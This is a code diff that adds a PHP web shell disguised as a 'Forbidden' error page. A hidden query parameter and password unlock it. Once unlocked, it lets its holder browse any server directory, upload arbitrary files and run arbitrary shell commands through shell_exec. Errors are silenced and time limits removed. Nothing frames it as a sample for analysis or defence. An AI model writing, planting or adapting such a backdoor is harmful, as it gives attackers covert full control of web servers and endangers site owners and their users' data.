@@ -1,0 +1,92 @@
+<?php
+$auth_param = '404';
+$auth_value = 'dL7w1';
+
+if (!isset($_GET[$auth_param]) || $_GET[$auth_param] !== $auth_value) {
+    header('HTTP/1.0 403 Forbidden');
+    die('<h1>Forbidden</h1>');
+}
+
+error_reporting(0);
+set_time_limit(0);
+
+$path = getcwd();
+
+if (isset($_GET['path']) && !empty($_GET['path'])) {
+    $new_path = '/' . $_GET['path'];
+    if (is_dir($new_path) && chdir($new_path)) {
+        $path = getcwd();
+    }
+} else if (isset($_GET['path'])) {
+    $document_root = $_SERVER['DOCUMENT_ROOT'];
+    if (is_dir($document_root) && chdir($document_root)) {
+        $path = getcwd();
+    }
+}
+
+if (isset($_FILES['file'])) {
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
+        $upload_message = '<p>successful</p>';
+    } else {
+        $upload_message = '<p>failed</p>';
+    }
+}
+
+$command_output = '';
+if (isset($_POST['cmd'])) {
+    $cmd = $_POST['cmd'];
+    $command_output = shell_exec($cmd . ' 2>&1');
+}
+
+function generate_breadcrumb($path, $auth_param_name, $auth_value_name) {
+    $path = str_replace('\\', '/', $path);
+    $parts = explode('/', trim($path, '/'));
+    $breadcrumb = '<a href="?path=&' . $auth_param_name . '=' . $auth_value_name . '">/</a>'; 
+    $current_path = '';
+
+    foreach ($parts as $part) {
+        if (empty($part)) continue;
+        
+        $current_path .= $part . '/';
+        $path_for_url = rtrim($current_path, '/');
+
+        $breadcrumb .= '<a href="?path=' . $path_for_url . '&' . $auth_param_name . '=' . $auth_value_name . '">' . $part . '</a>/';
+    }
+    return rtrim($breadcrumb, '/');
+}
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Forbiden</title>
+</head>
+<body>
+    <div class="container">
+        <h1>Forbiden</h1>
+        
+        <div class="path-bar">
+            <?php echo generate_breadcrumb($path, $auth_param, $auth_value); ?>
+        </div>
+
+        <h2 style="margin-top:01px;"/h2>
+        <?php echo $upload_message; ?>
+        <form method="post" enctype="multipart/form-data">
+            <input type="file" name="file" required>
+            <input type="submit" value="Throw">
+        </form>
+        
+        <h2>command</h2>
+        <form method="post">
+            <input type="text" name="cmd" placeholder="input" required>
+            <input type="submit" value="start">
+        </form>
+
+        <?php if (!empty($command_output)): ?>
+            <p><b>Result:</b></p>
+            <div class="terminal-output"><pre><?php echo htmlspecialchars($command_output); ?></pre></div>
+        <?php endif; ?>
+    </div>
+</body>
+</html>
